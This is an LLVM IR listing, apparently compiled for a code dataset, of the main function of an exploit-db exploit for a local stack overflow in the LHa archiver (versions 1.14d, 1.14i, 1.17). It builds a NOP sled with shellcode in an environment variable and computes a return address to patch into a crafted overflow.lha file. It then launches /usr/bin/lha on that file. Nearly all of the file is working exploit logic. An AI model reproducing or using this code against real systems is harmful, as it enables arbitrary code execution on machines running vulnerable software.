; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_24067.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_24067.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [41 x i8] c"[-] Enter The Full Of the overflow.lha \0A\00", align 1
@.str.1 = private unnamed_addr constant [52 x i8] c"--------------------------------------------------\0A\00", align 1
@.str.2 = private unnamed_addr constant [21 x i8] c"| Author : N4rK07IX\0A\00", align 1
@.str.3 = private unnamed_addr constant [30 x i8] c"| Found by : Ulf Ha'rnhammar\0A\00", align 1
@.str.4 = private unnamed_addr constant [57 x i8] c"| LHa 1.14d 1.14i 1.17 Local Lame Stack Overflow Sploit\0A\00", align 1
@.str.5 = private unnamed_addr constant [26 x i8] c"| narkotix@linuxmail.org\0A\00", align 1
@.str.6 = private unnamed_addr constant [53 x i8] c"|--------------------------------------------------\0A\00", align 1
@BUFFERSIZE = common dso_local global i32 0, align 4
@FEED = common dso_local global i32 0, align 4
@shellcode = common dso_local global i8* null, align 8
@.str.7 = private unnamed_addr constant [8 x i8] c"ADDICT=\00", align 1
@.str.8 = private unnamed_addr constant [13 x i8] c"/usr/bin/lha\00", align 1
@.str.9 = private unnamed_addr constant [24 x i8] c"[+] RET ADDRESS = 0x%x\0A\00", align 1
@.str.10 = private unnamed_addr constant [79 x i8] c"[!] Paste These ASCII 4 bytes Ret Adress to the XXXX in the file overflow.lha\0A\00", align 1
@.str.11 = private unnamed_addr constant [31 x i8] c"[!] ASCII RET ADDR = %c%c%c%c\0A\00", align 1
@.str.12 = private unnamed_addr constant [29 x i8] c"[+] Exploiting the buffer..\0A\00", align 1
@PATH = common dso_local global i32 0, align 4
@PROG = common dso_local global i32 0, align 4
@.str.13 = private unnamed_addr constant [2 x i8] c"x\00", align 1
@.str.14 = private unnamed_addr constant [8 x i8] c"execl()\00", align 1
@.str.15 = private unnamed_addr constant [15 x i8] c"[+] Done B4by\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32*, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i64, align 8
  %13 = alloca i8, align 1
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %17 = load i32, i32* %4, align 4
  %18 = icmp slt i32 %17, 2
  br i1 %18, label %19, label %22

19:                                               ; preds = %2
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str, i64 0, i64 0))
  %21 = call i32 @exit(i32 -1) #4
  unreachable

22:                                               ; preds = %2
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.1, i64 0, i64 0))
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0))
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.3, i64 0, i64 0))
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.4, i64 0, i64 0))
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.5, i64 0, i64 0))
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.6, i64 0, i64 0))
  %29 = load i32, i32* @BUFFERSIZE, align 4
  %30 = zext i32 %29 to i64
  %31 = call i8* @llvm.stacksave()
  store i8* %31, i8** %6, align 8
  %32 = alloca i8, i64 %30, align 16
  store i64 %30, i64* %7, align 8
  %33 = load i32, i32* @FEED, align 4
  %34 = zext i32 %33 to i64
  %35 = alloca i8, i64 %34, align 16
  store i64 %34, i64* %8, align 8
  %36 = trunc i64 %34 to i32
  %37 = call i32 @memset(i8* %35, i32 144, i32 %36)
  %38 = load i32, i32* @FEED, align 4
  %39 = load i8*, i8** @shellcode, align 8
  %40 = call i32 @strlen(i8* %39)
  %41 = sub nsw i32 %38, %40
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i8, i8* %35, i64 %42
  %44 = load i8*, i8** @shellcode, align 8
  %45 = load i8*, i8** @shellcode, align 8
  %46 = call i32 @strlen(i8* %45)
  %47 = call i32 @memcpy(i8* %43, i8* %44, i32 %46)
  %48 = call i32 @memcpy(i8* %35, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0), i32 7)
  %49 = call i32 @putenv(i8* %35)
  %50 = call i32 @strlen(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.8, i64 0, i64 0))
  %51 = sub i32 -1073741830, %50
  %52 = call i32 @strlen(i8* %35)
  %53 = sub i32 %51, %52
  %54 = zext i32 %53 to i64
  store i64 %54, i64* %12, align 8
  %55 = load i64, i64* %12, align 8
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.9, i64 0, i64 0), i64 %55)
  %57 = load i64, i64* %12, align 8
  %58 = and i64 %57, 255
  %59 = trunc i64 %58 to i8
  store i8 %59, i8* %13, align 1
  %60 = load i64, i64* %12, align 8
  %61 = and i64 %60, 65280
  %62 = lshr i64 %61, 8
  %63 = trunc i64 %62 to i8
  store i8 %63, i8* %14, align 1
  %64 = load i64, i64* %12, align 8
  %65 = and i64 %64, 16711680
  %66 = lshr i64 %65, 16
  %67 = trunc i64 %66 to i8
  store i8 %67, i8* %15, align 1
  %68 = load i64, i64* %12, align 8
  %69 = and i64 %68, 4278190080
  %70 = lshr i64 %69, 24
  %71 = trunc i64 %70 to i8
  store i8 %71, i8* %16, align 1
  %72 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.10, i64 0, i64 0))
  %73 = load i8, i8* %13, align 1
  %74 = sext i8 %73 to i32
  %75 = load i8, i8* %14, align 1
  %76 = sext i8 %75 to i32
  %77 = load i8, i8* %15, align 1
  %78 = sext i8 %77 to i32
  %79 = load i8, i8* %16, align 1
  %80 = sext i8 %79 to i32
  %81 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.11, i64 0, i64 0), i32 %74, i32 %76, i32 %78, i32 %80)
  %82 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.12, i64 0, i64 0))
  %83 = bitcast i8* %32 to i32*
  store i32* %83, i32** %10, align 8
  store i32 0, i32* %9, align 4
  br label %84

84:                                               ; preds = %93, %22
  %85 = load i32, i32* %9, align 4
  %86 = load i32, i32* @BUFFERSIZE, align 4
  %87 = icmp slt i32 %85, %86
  br i1 %87, label %88, label %96

88:                                               ; preds = %84
  %89 = load i64, i64* %12, align 8
  %90 = trunc i64 %89 to i32
  %91 = load i32*, i32** %10, align 8
  %92 = getelementptr inbounds i32, i32* %91, i32 1
  store i32* %92, i32** %10, align 8
  store i32 %90, i32* %91, align 4
  br label %93

93:                                               ; preds = %88
  %94 = load i32, i32* %9, align 4
  %95 = add nsw i32 %94, 4
  store i32 %95, i32* %9, align 4
  br label %84

96:                                               ; preds = %84
  %97 = load i32, i32* @PATH, align 4
  %98 = load i32, i32* @PROG, align 4
  %99 = load i8**, i8*** %5, align 8
  %100 = getelementptr inbounds i8*, i8** %99, i64 1
  %101 = load i8*, i8** %100, align 8
  %102 = call i32 @execl(i32 %97, i32 %98, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0), i8* %101, i32* null)
  %103 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.14, i64 0, i64 0))
  %104 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.15, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  %105 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %105)
  %106 = load i32, i32* %3, align 4
  ret i32 %106
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @putenv(i8*) #1

declare dso_local i32 @execl(i32, i32, i8*, i8*, i32*) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
